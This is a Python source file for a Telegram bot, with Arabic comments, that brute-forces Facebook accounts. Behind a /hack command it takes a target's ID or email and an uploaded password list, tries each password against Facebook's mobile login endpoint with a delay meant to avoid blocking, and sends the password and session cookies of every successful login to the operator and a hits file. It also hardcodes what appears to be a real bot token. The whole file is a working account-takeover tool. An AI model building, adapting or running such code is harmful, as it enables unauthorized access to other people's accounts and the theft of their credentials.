#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
بوت تيليجرام لاختبار حسابات فيسبوك
قم بتعديل التوكن والآيدي أدناه
"""

# ======== قم بتعديل هذه المتغيرات فقط ========
BOT_TOKEN = "7762636390:AAEyyZ--hfUxAWYM-SRq9oT5ddhqzxKySSA"  # توكن البوت الخاص بك
ADMIN_USER_ID = "1231618861"  # معرف المستخدم الخاص بك
# ==========================================

import os
import time
import logging
import requests
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ConversationHandler

# تكوين التسجيل
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# حالات المحادثة
TARGET_ID = 0
COMBO_FILE = 1

def start(update: Update, context: CallbackContext) -> None:
    """إرسال رسالة عند تنفيذ الأمر /start."""
    user_id = str(update.effective_user.id)
    
    # التحقق مما إذا كان المستخدم هو المسؤول
    if user_id != ADMIN_USER_ID:
        update.message.reply_text('عذراً، هذا البوت مخصص للاستخدام الخاص فقط.')
        return
    
    update.message.reply_text(
        'مرحباً! أنا بوت اختبار حسابات فيسبوك.\n'
        'استخدم الأمر /hack لبدء عملية الاختبار.\n'
        'استخدم الأمر /cancel في أي وقت للإلغاء.'
    )

def hack(update: Update, context: CallbackContext) -> int:
    """بدء محادثة لاختبار حساب فيسبوك."""
    user_id = str(update.effective_user.id)
    
    # التحقق مما إذا كان المستخدم هو المسؤول
    if user_id != ADMIN_USER_ID:
        update.message.reply_text('عذراً، هذا الأمر مخصص للمسؤول فقط.')
        return ConversationHandler.END
    
    update.message.reply_text('أدخل الآيدي أو الإيميل أو رقم الحساب الخاص بالهدف:')
    return TARGET_ID

def target_id_received(update: Update, context: CallbackContext) -> int:
    """تخزين معرف الهدف وطلب ملف كلمات المرور."""
    context.user_data['target_id'] = update.message.text
    update.message.reply_text('أرسل ملف كلمات المرور (بتنسيق .txt):')
    return COMBO_FILE

def combo_file_received(update: Update, context: CallbackContext) -> int:
    """معالجة ملف كلمات المرور المستلم وبدء عملية الاختبار."""
    # التحقق من وجود ملف
    if not update.message.document:
        update.message.reply_text('يرجى إرسال ملف نصي (.txt) يحتوي على كلمات المرور.')
        return COMBO_FILE
    
    file = update.message.document
    if not file.file_name.endswith('.txt'):
        update.message.reply_text('يرجى إرسال ملف بتنسيق .txt فقط.')
        return COMBO_FILE
    
    # تنزيل الملف
    file_id = file.file_id
    new_file = context.bot.get_file(file_id)
    file_path = f"passwords_{update.effective_user.id}.txt"
    new_file.download(file_path)
    
    # قراءة كلمات المرور من الملف
    try:
        with open(file_path, 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
    except Exception as e:
        update.message.reply_text(f'حدث خطأ أثناء قراءة الملف: {str(e)}')
        return ConversationHandler.END
    
    # بدء عملية الاختبار
    target_id = context.user_data['target_id']
    update.message.reply_text(f'بدء اختبار الحساب: {target_id} مع {len(passwords)} كلمة مرور. سأبلغك بالنتائج...')
    
    # تشغيل عملية الاختبار في خلفية
    context.job_queue.run_once(
        perform_login_test, 
        1, 
        context={
            'chat_id': update.effective_chat.id,
            'target_id': target_id,
            'passwords': passwords,
            'file_path': file_path
        }
    )
    
    return ConversationHandler.END

def perform_login_test(context: CallbackContext) -> None:
    """تنفيذ اختبار تسجيل الدخول لكل كلمة مرور."""
    job_data = context.job.context
    chat_id = job_data['chat_id']
    target_id = job_data['target_id']
    passwords = job_data['passwords']
    file_path = job_data['file_path']
    
    context.bot.send_message(chat_id=chat_id, text=f'جاري اختبار {len(passwords)} كلمة مرور...')
    
    session = requests.session()
    success_count = 0
    checkpoint_count = 0
    
    for i, password in enumerate(passwords):
        # إرسال تحديث كل 10 كلمات مرور
        if i > 0 and i % 10 == 0:
            context.bot.send_message(
                chat_id=chat_id, 
                text=f'تم اختبار {i}/{len(passwords)} كلمة مرور. العثور على {success_count} ناجحة و {checkpoint_count} تحت الفحص.'
            )
        
        # تنفيذ محاولة تسجيل الدخول
        response = perform_login(session, target_id, password)
        result = handle_login_response(response, target_id, password, session, context.bot, chat_id)
        
        if result == "success":
            success_count += 1
        elif result == "checkpoint":
            checkpoint_count += 1
        
        # تأخير قصير لتجنب الحظر
        time.sleep(1)
    
    # إرسال التقرير النهائي
    context.bot.send_message(
        chat_id=chat_id,
        text=f'اكتمل الاختبار! تم اختبار {len(passwords)} كلمة مرور.\n'
             f'النتائج: {success_count} ناجحة، {checkpoint_count} تحت الفحص، '
             f'{len(passwords) - success_count - checkpoint_count} فاشلة.'
    )
    
    # حذف ملف كلمات المرور المؤقت
    try:
        os.remove(file_path)
    except:
        pass

def perform_login(session, email_or_id, password):
    """محاولة تسجيل الدخول إلى فيسبوك."""
    cookies = {
        'datr': 'eE3bZVRfHsuNzDgq4JoLFEad',
        'sb': 'eE3bZT9cCTFBlSLzDqdpLl9C',
        'ps_l': '0',
        'ps_n': '0',
        'dpr': '2.1988937854766846',
        'wd': '891x1708',
        'fr': '0XBKAAVB6DOFQgcPM..Bl5E-o..AAA.0.0.Bl6zF5.AWWvlxXPFKI',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    data = {
        'email': email_or_id,
        'pass': password,
        'login': 'تسجيل الدخول',
    }
    
    try:
        response = session.post('https://d.facebook.com/login/device-based/regular/login/', 
                               cookies=cookies, headers=headers, data=data)
        return response
    except Exception as e:
        logger.error(f"Login error: {str(e)}")
        return None

def handle_login_response(response, email_or_id, password, session, bot, chat_id):
    """معالجة استجابة تسجيل الدخول وإرسال النتائج."""
    if response is None:
        return "error"
    
    if "c_user" in session.cookies.get_dict():
        cookies = "; ".join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
        account_url = f"https://www.facebook.com/profile.php?id={email_or_id}"
        
        message = f"""
✅ تم اختراق الحساب بنجاح
---------------------------
**Email/ID:** {email_or_id}
**Password:** {password}
**Cookies:** {cookies}
**URL:** {account_url}
---------------------------
        """
        
        bot.send_message(chat_id=chat_id, text=message)
        
        # حفظ النتائج في ملف
        with open('Facebook_Hits.txt', 'a') as file:
            file.write(f"{email_or_id}:{password}\n{message}\n")
        
        return "success"
    
    elif "checkpoint" in session.cookies.get_dict():
        cookies = "; ".join([f"{key}={value}" for key, value in session.cookies.get_dict().items()])
        account_url = f"https://www.facebook.com/profile.php?id={email_or_id}"
        
        message = f"""
⚠️ حساب تحت الفحص
---------------------------
**Email/ID:** {email_or_id}
**Password:** {password}
**Cookies:** {cookies}
**URL:** {account_url}
---------------------------
        """
        
        bot.send_message(chat_id=chat_id, text=message)
        return "checkpoint"
    
    return "failed"

def cancel(update: Update, context: CallbackContext) -> int:
    """إلغاء المحادثة وإنهائها."""
    update.message.reply_text('تم إلغاء العملية.')
    return ConversationHandler.END

def error_handler(update: Update, context: CallbackContext) -> None:
    """معالجة الأخطاء."""
    logger.error(f"Error: {context.error} - Update: {update}")
    if update:
        update.message.reply_text('حدث خطأ أثناء معالجة طلبك. يرجى المحاولة مرة أخرى لاحقاً.')

def main():
    """تشغيل البوت."""
    # التحقق من وجود توكن البوت
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN غير محدد. يرجى تعيين متغير البيئة BOT_TOKEN.")
        return
    
    # إنشاء البوت والمحدث
    updater = Updater(BOT_TOKEN)
    dispatcher = updater.dispatcher
    
    # إضافة معالجات الأوامر
    dispatcher.add_handler(CommandHandler("start", start))
    
    # إضافة معالج المحادثة
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('hack', hack)],
        states={
            TARGET_ID: [MessageHandler(Filters.text & ~Filters.command, target_id_received)],
            COMBO_FILE: [MessageHandler(Filters.document & ~Filters.command, combo_file_received)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    dispatcher.add_handler(conv_handler)
    
    # إضافة معالج الأخطاء
    dispatcher.add_error_handler(error_handler)
    
    # بدء البوت
    updater.start_polling()
    logger.info("البوت قيد التشغيل الآن!")
    updater.idle()

if __name__ == "__main__":
    main()
